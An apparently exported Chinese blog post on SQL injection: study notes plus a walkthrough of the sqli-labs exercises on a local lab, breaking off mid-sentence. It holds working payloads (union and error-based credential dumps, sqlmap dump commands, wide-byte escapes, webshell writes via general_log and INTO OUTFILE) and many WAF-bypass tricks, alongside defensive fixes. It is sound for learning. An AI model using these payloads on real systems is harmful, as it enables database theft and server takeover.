\n\t//print_r(mysql_error());\n```\n\n闭合类型改变。\n\n#### 3.2.17 Less-17\n\n```php\n//过滤\n$uname=check_input($_POST['uname']);\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1\";\n\nif true\n    $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\";\n\tif error\n        print_r(mysql_error());\n```\n\n`uname`被过滤了，只能考虑update这里注入，使用报错注入即可。\n\n#### 3.2.18 Less-18\n\n```php\n$uagent = $_SERVER['HTTP_USER_AGENT'];\n$IP = $_SERVER['REMOTE_ADDR'];\n//uname和passwd被过滤\n$uname = check_input($_POST['uname']);\n$passwd = check_input($_POST['passwd']);\n\n$sql=\"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\";\n\nif true\n    $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";\n\techo 'Your User Agent is: ' .$uagent;\n\tprint_r(mysql_error());\t\nelse \n    print_r(mysql_error());\n```\n\n这里`uname`和`passwd`被过滤了，因此只能在insert语句注入。\n\n- `$_SERVER['HTTP_CLIENT_IP']` 客户端可以伪造。\n- `$_SERVER['HTTP_X_FORWARDED_FOR']`，客户端可以伪造。\n- `$_SERVER['REMOTE_ADDR']`，客户端不能伪造。\n\n所以这里只能在`User-Agent`注入。\n\n```sql\nUser-Agent: 1'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1\n```\n\n![image-20250310224830354](sql注入/image-20250310224830354.png)\n\n#### 3.2.19 Less-19\n\n```php\n$uagent = $_SERVER['HTTP_REFERER'];\n$IP = $_SERVER['REMOTE_ADDR'];\n//uname和passwd被过滤\n$uname = check_input($_POST['uname']);\n$passwd = check_input($_POST['passwd']);\n\n$sql=\"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\";\n\nif true\n    $insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\";\n\techo 'Your Referer is: ' .$uagent;\n\tprint_r(mysql_error());\t\nelse \n    print_r(mysql_error());\n```\n\n`User-Agent`改为了`Referer`。\n\n#### 3.2.20 Less-20\n\n```php\nif(!isset($_COOKIE['uname']))\n    //过滤uname和passwd\n    $uname = check_input($_POST['uname']);\n    $passwd = check_input($_POST['passwd']);\n\n    $sql=\"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\";\n    $cookee = $row1['username'];\n    if true\n        setcookie('uname', $cookee, time()+3600);\n    else:\n        print_r(mysql_error());\nelse:\n    if(!isset($_POST['submit']))\n        $cookee = $_COOKIE['uname'];\n\n        $sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";\n        if (!$result)\n            print_r(mysql_error());\n        if($row)\n            \"输出查询的信息\"\n    else:\n        setcookie('uname', $row1['username'], time()-3600);\n?>\n```\n\n就是从`Cookie`中读取`uname`值，产生注入。\n\n### 3.3 Less21-37\n\n#### 3.3.1 Less-21\n\n```php\n$cookee = base64_decode($cookee);\n$sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\";\n```\n\n只节选了相关代码，其余与`Less-20`大差不差，主要是多了一个base64编码，这里可以用sqlmap脚本。\n\n```bash\n$ python sqlmap.py -u http://127.0.0.1:8888/Less-21/ --cookie=\"uname=*\" --tamper=\"base64encode\" -v 3 -D security -T users --dump --batch\n```\n\n![image-20250310230842396](sql注入/image-20250310230842396.png)\n\n#### 3.3.2 Less-22\n\n```php\n$cookee1 = '\"'. $cookee. '\"';    \n$sql=\"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1\";\n```\n\n闭合方式改变\n\n#### 3.3.3 Less-23\n\n```php\n$id=$_GET['id'];\n\n$reg = \"/#/\";\n$reg1 = \"/--/\";\n$replace = \"\";\n$id = preg_replace($reg, $replace, $id);\n$id = preg_replace($reg1, $replace, $id);\n\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n\nif true\n    \"查询结果\"\nelse:\n    print_r(mysql_error());\n```\n\n过滤了注释符，可以使用闭合方式。\n\n#### 3.3.4 Less-24\n\n`login_create.php`\n\n```php\n$username=  mysql_escape_string($_POST['username']) ;\n$pass= mysql_escape_string($_POST['password']);\n$re_pass= mysql_escape_string($_POST['re_password']);\n\n$sql = \"select count(*) from users where username='$username'\";\n\nif ($pass==$re_pass)\n  $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\";\n```\n\n`login.php`\n\n```php\n$username = mysql_real_escape_string($_POST[\"login_user\"]);\n$password = mysql_real_escape_string($_POST[\"login_password\"]);\n$sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\";\n```\n\n`pass_change.php`\n\n```php\n$username= $_SESSION[\"username\"];\n$curr_pass= mysql_real_escape_string($_POST['current_password']);\n$pass= mysql_real_escape_string($_POST['password']);\n$re_pass= mysql_real_escape_string($_POST['re_password']);\n\nif($pass==$re_pass)\n    $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";\n```\n\n这里大部分都被转义了，唯一可利用的地方在最后的`update`语句中的`username`，这里需要利用二次注入，即将构造的sql语句插入数据库中，在其被调用时触发。\n\n比如数据库有`username`值为`admin'#`，被拼接进`update`语句就会变成：\n\n```sql\nUPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'\n```\n\n那么就直接修改了`admin`用户的密码。\n\n先注册一个名为`admin'#`的用户\n\n![image-20250310232549937](sql注入/image-20250310232549937.png)\n\n然后登录后修改密码\n\n![image-20250310232652649](sql注入/image-20250310232652649.png)\n\n查看数据库发现`admin`用户密码被成功修改了\n\n```bash\nmysql> select * from security.users;\n+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  1 | Dumb     | Dumb       |\n|  2 | Angelina | I-kill-you |\n|  3 | Dummy    | p@ssword   |\n|  4 | secure   | crappy     |\n|  5 | stupid   | stupidity  |\n|  6 | superman | genious    |\n|  7 | batman   | mob!le     |\n|  8 | admin    | 1234       |\n|  9 | admin1   | admin1     |\n| 10 | admin2   | admin2     |\n| 11 | admin3   | admin3     |\n| 12 | dhakkan  | dumbo      |\n| 14 | admin4   | admin4     |\n| 15 | admin'#  | 123        |\n+----+----------+------------+\n```\n\n#### 3.3.5 Less-25\n\n接下来很多是绕过过滤的，所以只考虑绕过过滤的部分。\n\n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n\n$id= preg_replace('/or/i',\"\", $id);    \n$id= preg_replace('/AND/i',\"\", $id);\n```\n\n双写绕过`oorr`，符号替换`or`换成`||`。\n\n#### 3.3.6 Less-25a\n\n无区别。\n\n#### 3.3.7 Less-26\n\n```php\n$id= preg_replace('/or/i',\"\", $id);           \n$id= preg_replace('/and/i',\"\", $id);     \n$id= preg_replace('/[\\/\\*]/',\"\", $id);     \n$id= preg_replace('/[--]/',\"\", $id);    \n$id= preg_replace('/[#]/',\"\", $id);       \n$id= preg_replace('/[\\s]/',\"\", $id);     \n$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);    \n```\n\n`or`和`and`使用双写或者`||``&&`替换。\n\n过滤注释使用闭合绕过。\n\n空格字符绕过\n\n`%a0`：空格\n\n`%09`：TAB键（水平）\n\n`%0a`：新建一行\n\n`%0c`：新的一页\n\n`%0d`：return功能\n\n`%0b`：TAB键（垂直）\n\n`%00`：空字符\n\n#### 3.3.8 Less-26a\n\n无区别。\n\n#### 3.3.9 Less-27\n\n```php\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\n$id= preg_replace('/[--]/',\"\", $id);\n$id= preg_replace('/[#]/',\"\", $id);\n$id= preg_replace('/[ +]/',\"\", $id);\n$id= preg_replace('/select/m',\"\", $id);\n$id= preg_replace('/select/s',\"\", $id);\n$id= preg_replace('/Select/s',\"\", $id);\n$id= preg_replace('/SELECT/s',\"\", $id);\n$id= preg_replace('/union/s',\"\", $id);\n$id= preg_replace('/Union/s',\"\", $id);\n$id= preg_replace('/UNION/s',\"\", $id);\n```\n\n`select`和`union`使用大小写绕过和嵌套绕过即可。\n\n#### 3.3.10 Less-27a\n\n无区别。\n\n#### 3.3.11 Less-28\n\n```php\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\n$id= preg_replace('/[--]/',\"\", $id);\n$id= preg_replace('/[#]/',\"\", $id);\n$id= preg_replace('/[ +]/',\"\", $id);.\n$id= preg_replace('/union\\s+select/i',\"\", $id);\n```\n\n不能大小写绕过，嵌套绕过即可。\n\n#### 3.3.12 Less-28a\n\n无区别。\n\n#### 3.3.13 Less-29\n\n这里主要难点在`login.php`而不是`index.php`中。\n\n```php\n//提取id\nfunction java_implimentation($query_string)\n{\n\t$q_s = $query_string;\n\t$qs_array= explode(\"&\",$q_s);\n\tforeach($qs_array as $key => $value)\n\t{\n\t\t$val=substr($value,0,2);\n\t\tif($val==\"id\")\n\t\t{\n\t\t\t$id_value=substr($value,3,30); \n\t\t\treturn $id_value;\n\t\t\techo \"<br>\";\n\t\t\tbreak;\n\t\t}\n\t}\n}\n$qs = $_SERVER['QUERY_STRING'];\n$hint=$qs;\n$id1=java_implimentation($qs);\n$id=$_GET['id'];\n//id只能为数字\nwhitelist($id1);\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n```\n\n这里可以构造两个`id`，因为`java_implimentation()`函数只会拿到第一个`id`去检测，从而使得后面`id`绕过检测。\n\n这里根据语言特性绕过可以看本文前面部分。\n\n#### 3.3.14 Less-30\n\n没区别。\n\n#### 3.3.15 Less-31\n\n没区别。\n\n#### 3.3.16 Less-32\n\n```php\nfunction check_addslashes($string)\n{\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);  \n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);      \n    return $string;\n}\n\n$id=check_addslashes($_GET['id']);\n\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n```\n\n宽字节注入，`%df%5c`被当做一个汉字，使得`'`逃逸。\n\n使用`\\`转义`\\`，如`\\\\'`，第二个`\\`被转义，使`'`出来。\n\n将 utf-8 转换为 utf-16 或 utf-32，例如将 `'` 转为 utf-16 为`�`\n\n```bash\n$ echo \\'|iconv -f utf-8 -t utf-16\n��'\n```\n\n> 这里我的理解是，�在URL编码后为`%EF%BF%BD`，MySQL 在使用 GBK 编码的时候，`%EF%BF`被当做一个汉字，`%BD`与`%5c`也就是`\\`被当做一个汉字，因此单引号逃逸出来。\n\n可以让`'`逃逸出来\n\n```sql\n?id=1�'or 1%23\n```\n\n![image-20250311002549978](sql注入/image-20250311002549978.png)\n\n#### 3.3.17 Less-33\n\n没区别。\n\n#### 3.3.18 Less-34\n\n没区别。\n\n#### 3.3.19 Less-35\n\n没区别。\n\n#### 3.3.20 Less-36\n\n没区别\n\n#### 3.3.21 Less-37\n\n没区别。\n\n### 3.4 Less-38-53\n\n> 下面无特殊利用的就当做无区别了。\n\n#### 3.4.1 Less-38\n\n```php\n$id=$_GET['id'];\n\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nif (mysqli_multi_query($con1, $sql)):\n    \"查询结果\"\nelse:\n    print_r(mysqli_error($con1));\n```\n\n产生堆叠的原因在于`mysqli_multi_query()`函数，它会执行一个或用分号隔开的多个SQL语句。\n\n堆叠注入可以直接写马GetShell。\n\n这里先查看mysql配置\n\n```bash\nmysql> show variables like 'general%';\n+------------------+---------------------------------+\n| Variable_name    | Value                           |\n+------------------+---------------------------------+\n| general_log      | OFF                             |\n| general_log_file | /var/lib/mysql/e783195a8830.log |\n+------------------+---------------------------------+\n```\n\n可以看见默认没有开启，首先手动开启。\n\n```sql\n?id=1';set global general_log=\"ON\";set global general_log_file='/var/www/html/Less-38/shell.php'%23\n```\n\n```bash\nmysql> show variables like 'general%';\n+------------------+---------------------------------+\n| Variable_name    | Value                           |\n+------------------+---------------------------------+\n| general_log      | ON                              |\n| general_log_file | /var/www/html/Less-38/shell.php |\n+------------------+---------------------------------+\n```\n\n然后就可以写入php代码了\n\n```sql\n?id=1';select '<?php phpinfo();?>'%23\n```\n\n查看文件\n\n```bash\n$ cat /var/www/html/Less-38/shell.php\n250311 14:32:51    10 Connect   root@localhost on security\n                   10 Init DB   security\n                   10 Query     SELECT * FROM users WHERE id='1';select '<?php phpinfo();?>'#' LIMIT 0,1\n```\n\n成功写入，但是可能是权限的问题，没有成功执行。\n\n#### 3.4.2 Less-39\n\n无区别\n\n#### 3.4.3 Less-40\n\n无区别\n\n#### 3.4.4 Less-41\n\n无区别\n\n#### 3.4.5 Less-42\n\n类似于`Less-24`，少了一些过滤。\n\n#### 3.4.6 Less-43\n\n无区别。\n\n#### 3.4.7 Less-44\n\n无区别。\n\n#### 3.4.8 Less-45\n\n无区别。\n\n#### 3.4.9 Less-46\n\n```php\n$id=$_GET['sort'];\n\n$sql = \"SELECT * FROM users ORDER BY $id\";\n\nif true\n    \"查询结果\"\nelse：\n    print_r(mysql_error());\n```\n\n`order by`注入，具体看本文order by注入部分。\n\n#### 3.4.10 Less-47\n\n无区别。\n\n#### 3.4.11 Less-48\n\n无区别。\n\n#### 3.4.12 Less-49\n\n无区别。\n\n#### 3.4.13 Less-50\n\n无区别。\n\n#### 3.4.14 Less-51\n\n无区别。\n\n#### 3.4.15 Less-52\n\n无区别。\n\n#### 3.4.16 Less-53\n\n无区别。\n\n### 3.5 Less54-65\n\n#### 3.5.1 Less-54\n\n```php\n$times= 10;\n\nif(isset($_POST['reset']))\n    setcookie('challenge', ' ', time() - 3600000);\n\nelse:\n    if(isset($_COOKIE['challenge']))\n        $sessid=$_COOKIE['challenge'];\n    else:\n        $expire = time()+60*60*24*30;\n        $hash = data($table,$col);\n        setcookie(\"challenge\", $hash, $expire);\n    if $_GET['id']:\n        $sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\";\n    if true\n        \"查询结果\"\n    else：\n       \n$key = addslashes($_POST['key']);\n$key = mysql_real_escape_string($key);\n$sql=\"SELECT 1 FROM $table WHERE $col1= '$key'\";\n```\n\n十次以内查出结果\n\n判断闭合\n\n```sql\n?id=1'\n?id=1'%23\n```\n\n判断字段数\n\n```sql\n?id=1'order by 3%23\n?id=1'order by 4%23\n```\n\n查数据库名\n\n```sql\n?id=-1'union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23\ninformation_schema,challenges,mysql,performance_schema,security\n```\n\n查表名\n\n```sql\n?id=-1'union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')%23\n1KBD9AIPC9\n```\n\n查字段名\n\n```sql\n?id=-1'union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='1KBD9AIPC9')%23\nid,sessid,secret_2TF1,tryy\n```\n\n查key值\n\n```sql\n?id=-1'union select 1,2,(select concat(secret_2TF1) from challenges.1KBD9AIPC9)%23\nvJWlm4ld9mZEZN2o7n59t4A8\n```\n\n总共八次。\n\n#### 3.5.2 Less-55\n\n无区别。\n\n#### 3.5.3 Less-56\n\n无区别。\n\n#### 3.5.4 Less-57\n\n无区别。\n\n#### 3.5.5 Less-58\n\n```php\n$sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\";\nif true\n    echo 'Your Login name : '. $unames[$row['id']];\n    echo 'Your Password : ' .$pass[$row['id']];\nelse\n    print_r(mysql_error());\n```\n\n联合查询没结果输出，改为报错注入。\n\n#### 3.5.6 Less-59\n\n无区别。\n\n#### 3.5.7 Less-60\n\n无区别。\n\n#### 3.5.8 Less-61\n\n无区别。\n\n#### 3.5.9 Less-62\n\n```php\n$sql=\"SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1\";\nif true\n    echo 'Your Login name : '. $unames[$row['id']];\n    echo 'Your Password : ' .$pass[$row['id']];\nelse\n    //print_r(mysql_error());\n```\n\n不能报错注入了，改为布尔盲注或者时间盲注即可\n\n#### 3.5.9 Less-63\n\n无区别。\n\n#### 3.5.10 Less-64\n\n无区别。\n\n#### 3.5.1 Less-65\n\n无区别。\n\n### 3.6 总结\n\n终于是刷完了，总体来说把每种注入方式都练习了个遍，并学习了一些绕过手法，整个过程除了`Less-1`跟着大佬把`sqlmap`使用熟悉了一下，其余均为手注，加强自己的能力，尽量不变成离了脚本就活不了的脚本小子（）。但是其实还有许多利用手法没有学到，以后遇到就在本文填补，避免做完就忘了。\n","source":"_posts/sql注入.md","raw":"---\ntitle: sql注入\nhide: false\ntags:\n  - 网络安全\nabbrlink: 31899\ndate: 2025-03-04 22:43:25\n---\n\n\n\n## 1. 概述\n\n**漏洞描述**\n\n​\tWeb程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。\n\n**漏洞存在条件**\n\n- 参数用户可控。\n- 参数带入数据库查询。\n\n**测试方法**\n\n​\t在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1=1 和 and 1=2 以及字符型注入进行判断。\n\n**修复方法**\n\n​\t在代码层最佳的防御SQL注入的手段是SQL语句的**预编译和绑定变量**。\n\n​\t（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。\n\n​\t（2）对进入数据库的特殊字符（ ' <>&*; 等）进行转义处理，或编码转换。\n\n​\t（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。\n\n​\t（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 \n\n​\t（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 \n\n​\t（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 \n\n​\t（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。\n\n\n\n### 1.1 MySQL相关知识\n\n​\t在**mysql5**版本以后，存在一个数据库为`information_schema`，在这个库里面，有三个重要的表：`columns`，`tables`，`SCHEMATA`表，在`SCHEMATA`表中的字段`SCHEMA_NAME`存放着数据库的信息。`tables`表中`TABLE_SCHEMA`和`TABLE_NAME`分别记录库名和表名。`columns`存储该用户创建的所有数据库的库名、表名和字段名。\n\n#### 1.1.1 Navicat连接Docker容器内MySQL\n\n> 有这个需求的原因是我太懒了，因为是用的docker开的sqli labs环境，又不想本地再配MySQL环境，因此干脆直接利用了。\n\n```bash\n$ docker run -dt --name sqli-labs -p 8888:80 -p 3307:3306 -e MYSQL_ROOT_PASSWORD=root acgpiano/sqli-labs:latest\n```\n\n这里需要给MySQL开一个端口映射，我这里给的是`3307`端口。\n\n```bash\n$ docker exec -it sqli-labs /bin/bash\n$ mysql\n```\n\n接下来将host修改为`%`即可。\n\n```sql\nselect host,user from user where user='root';\nFLUSH PRIVILEGES;\n```\n\n<img src=\"sql注入/image-20250306000604769.png\" alt=\"image-20250306000604769\" style=\"zoom:50%;\" />\n\n\n### 1.2 判断是否存在注入\n\n```sql\nid=1 and 1=1\nid=1 and 1=2\nid=1 or 1=1\nid='1'or'1'='1'\nid=\"1\"or\"1\"=\"1\"\n```\n\n**有回显**：页面有数据信息返回。\n\n**无回显**：输入不同语句，页面无任何变化。\n\n\n\n### 1.3 SQL注释符\n\n`#`：单行注释，常编码为%23。\n\n`--空格`：单行注释，注意后面有个空格。\n\n`/**/`：多行注释，至少存在两处的注入，也常用来作为空格绕过。\n\n\n\n### 1.4 SQL注入分类\n\n按注入手法来分：**联合查询、堆叠查询、布尔型、报错型、基于时间延迟**。\n\n按请求类型来分：**GET注入、POST注入、COOKIE注入。**\n\n按注入数据类型来分：**int型、string型、like型**\n\n\n\n#### 1.4.1 报错注入\n\n**XPATH报错注入**\n\n`updatexml（XML_document，XPath_string，new_value）`、`extractvalue（XML_document，xpath_string）`，XPATH的格式形如`/test`，如果XPATH出现格式错误，则会爆出XPATH语法错误。\n\n**floor()函数报错**\n\n```sql\nselect count(*),concat('x',floor(rand(0)*2))x from information_schema.tables group by x\n```\n\n`rand(0)`的重复计算是固定的，会随机生成一个[0,1]的小数，`rand(0)*2`则生成[0,2]的数，`floor()`函数是向下取整，即最后结果为0或1。我们运行一下看看。\n\n```sql\nselect floor(rand(0)*2) from information_schema.tables limit 0,8;\n```\n\n![image-20250306001213412](sql注入/image-20250306001213412.png)\n\n可以发现这里`floor(rand(0)*2)`的值是固定的。\n\n接下来说一下`group by`的原理，`group by`在执行时，会依次取出查询表中的记录创建一个临时表，`group by`的对象就是该临时表的主键，如果临时表中出现了该主键，则该值加一，若不存在则**插入**。再来看这个SQL语句。\n\n```sql\nselect count(*),concat('x',floor(rand(0)*2))x from information_schema.tables group by x\n```\n\n其键必然为`x1`或者`x0`，那么应该只会值增加呀，为什么会报错呢？\n\n这里有个重要特性：当`group by`和`rand()`同时使用时，若该临时表中没有主键，则插入前`rand()`会再执行一次。\n\n那么我们来推断一下，第一次执行，`key`应该为`x0`，但是`x0`不存在，因此`rand(0)`又计算了一遍，最终第一次执行结果为`x1`。\n\n第二次执行，这时候`key`应该为`x1`，已存在，则值加一即可。\n\n第三次执行，这时候key应该为`x0`，不存在，`rand(0)`重新计算一遍，最终应该插入的`key`为`x1`，这里就出了问题了，它会直接插入，从而导致主键重复报错，这就是该报错原理。\n\n![image-20250306003105176](sql注入/image-20250306003105176.png)\n\n**优化方案**\n\n学习的[这篇文章](https://www.freebuf.com/articles/web/257881.html)，将`rand(0)`改为了`rand(14)`，运行一下看看。\n\n```sql\nmysql> select floor(rand(14)*2) from information_schema.tables limit 0,8;\n+-------------------+\n| floor(rand(14)*2) |\n+-------------------+\n|                 1 |\n|                 0 |\n|                 1 |\n|                 0 |\n|                 0 |\n|                 0 |\n|                 1 |\n|                 1 |\n+-------------------+\n8 rows in set (0.00 sec)\n```\n\n这里只需要两条数据即可报错，但是如果只有一条数据`floor()`报错注入就不能用了，因为一条数据没办法重复。\n\n\n\n#### 1.4.2 ORDER BY注入\n\n主要是不能使用联合注入，还有一些函数区别。\n\n**验证方式**\n\n升序降序\n\n```sql\n?sort=1 asc # 升序\n?sort=1 desc # 降序\n```\n\n`rand()`函数验证，`rand()`每次结果随机，因此查询出结果顺序也是随机。\n\n```sql\n?sort=rand()\n?sort=1 and rand()\n```\n\n延时验证，延时的时间为 (行数 * 1) 秒\n\n```sql\n?sort=sleep(1)\n?sort=1 and sleep(1)\n```\n\n**利用方式**\n\n报错注入\n\n```sql\n?sort=1 and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23 # floor()\n?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) # procedure analyse\n```\n\n布尔盲注和时间盲注使用`rand()`函数即可\n\n```sql\n?sort=rand(left(database(),1)>'r')\n?sort=rand(if(ascii(substr(database(),1,1))>114,1,sleep(1)))\n```\n\n写入文件，使用`lines terminated by`，`0x3c3f70687020706870696e666f28293b3f3e`是`<php phpinfo();>`的十六进制编码。\n\n```sql\n?sort=1 into outfile \"/var/www/html/less46.php\" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e\n```\n\n\n\n## 2. SQL注入绕过\n\n\n### 2.1 空格字符绕过\n\n`%a0`：空格\n\n`%09`：TAB键（水平）\n\n`%0a`：新建一行\n\n`%0c`：新的一页\n\n`%0d`：return功能\n\n`%0b`：TAB键（垂直）\n\n`%00`：空字符\n\n`/**/`：替换空格\n\n`/*!*/`：内联注释\n\n\n\n### 2.2 大小写绕过\n\n```sql\nunion select -> UniOn SelEcT\n```\n\n\n\n### 2.3 浮点数绕过\n\n```sql\nselect * from users where id=8E0union select 1,2,3,4;\nselect * from users where id=8.0union select 1,2,3,4;\n```\n\n\n\n### 2.4 NULL绕过\n\n`\\N`代表NULL\n\n\n\n### 2.5 引号绕过\n\n```sql\nselect * from users where id=\"1\" #双引号绕过\nselect * from users where username=0x61646D696E; # 字符串转换为16进制\nselect * from users where id=-1 union select 1,2,(select group_concat(column_name)\nfrom information_schema.columns where TABLE_NAME='users' limit 1),4; # 如果开启gpc，整数型也可以用十六进制绕过\n```\n\n\n\n### 2.6 添加库名绕过\n\n```sql\nselect * from users where id=-1 union select 1,2,3,4 from users;\nselect * from users where id=-1 union select 1,2,3,4 from test.users;\n```\n\n\n\n### 2.7 去重复绕过\n\n在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。\n\n```sql\nselect * from users where id=-1 union distinct select 1,2,3,4 from users;\nselect * from users where id=-1 union distinct select 1,2,3,version() fromusers;\n```\n\n\n\n### 2.8 反引号绕过\n\n字段加反引号可以绕过一些WAF拦截。\n\n```sql\nselect * from users where id=-1 union select 1,2,3,4 from `test.users`;\n```\n\n\n\n### 2.9 语言特性绕过\n\n在 php 语言中 id=1&id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。\n\n|               服务器中间件                |          解析结果          |       举例说明       |\n| :---------------------------------------: | :------------------------: | :------------------: |\n|                ASP.NET/IIS                | 所有出现的参数值用逗号连接 |    color=red,blue    |\n|                  ASP/IIS                  |  所有出现的参数用逗号连接  |    color=red,blue    |\n|                PHP/Apache                 |    仅最后一次出现参数值    |      color=blue      |\n|                 PHP/Zeus                  |    仅最后一次出现参数值    |      color=blue      |\n|         JSP,Servlet/Apache Tomcat         |     仅第一次出现参数值     |      color=red       |\n| JSP,Servlet/Oracle Application Server 10g |     仅第一次出现参数值     |      color=red       |\n|             JSP,Servlet/Jetty             |     仅第一次出现参数值     |      color=red       |\n|             IBM Lotus Domino              |    仅最后一次出现参数值    |      color=blue      |\n|              IBM HTTP Server              |     仅第一次出现参数值     |      color=red       |\n|         mod_perl,libapreq2/Apache         |     仅第一次出现参数值     |      color=red       |\n|              Perl CGI/Apache              |     仅第一次出现参数值     |      color=red       |\n|          mod_wsgi(Python)/Apache          |     仅第一次出现参数值     |      color=red       |\n|                Python/Zope                |         转化为List         | color=['red','blue'] |\n\n\n\n### 2.10 逗号绕过\n\n`substr`\n\n```sql\nselect(substr(database() from 1 for 1);\n```\n\n`mid`\n\n```sql\nselect mid(database() from 1 for 1);\n```\n\n`join`\n\n```sql\nunion select * from 1,2\nunion select * from (select 1)a join (select 2)b\n```\n\n`like`\n\n```sql\nselect user() like '%r%';\n```\n\n`offset`\n\n```sql\nlimit 1 offset 0\n```\n\n\n\n### 2.11 or and xor not绕过\n\n`&&`等价于and\n\n`||`等价于or\n\n`!`等价于not\n\n`|`等价于xor\n\n\n\n### 2.12 ASCII字符对比绕过\n\n```sql\nselect * from users where id=1 and ascii(substring(user(),1,1))=114; # char(114)='r'\n```\n\n\n\n### 2.13 等号绕过\n\n```sql\nascii(substring(user(),1,1))<115; # > <\nselect substring(user(),1,1)like 'r%'; #like rlike\nselect user() regexp '^r'; # regexp\n```\n\n\n\n### 2.14 双写绕过\n\n```sql\nuniunionon seleselectct\n```\n\n\n\n### 2.15 二次编码绕过\n\n`-1 union select 1,2,3,4# `\n\n第一次编码：\n\n`%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 `\n\n第二次编码：\n\n`%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33`\n\n\n\n### 2.16 参数拆分绕过\n\n对于a=[input1]&b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了`union select`，可以使用参数拆分\n\n```sql\n-1'union/*&username=*/select 1,user(),3,4--+\n```\n\n\n\n### 2.17 生僻函数绕过\n\n```sql\nselect polygon((select * from (select * from (select @@version) f) x)); # polygon()替换updatexml()\n```\n\n\n\n### 2.18 分块传输绕过\n\n​\t如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。\n\n​\t接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(\"\\r\\n\")。然后是数据本身，数据结束后，还会有CRLF(\"\\r\\n\")两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。\n\n\n\n### 2.19 信任白名单绕过\n\nWAF会自带一些文件白名单，可以利用白名单绕过\n\n```sql\n/phpmyadmin?name=%27%20union%20select%201,user()--+&submit=1\n```\n\n\n\n### 2.20 pipline绕过\n\n​\thttp协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个Connection字段，一般值为close，Apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 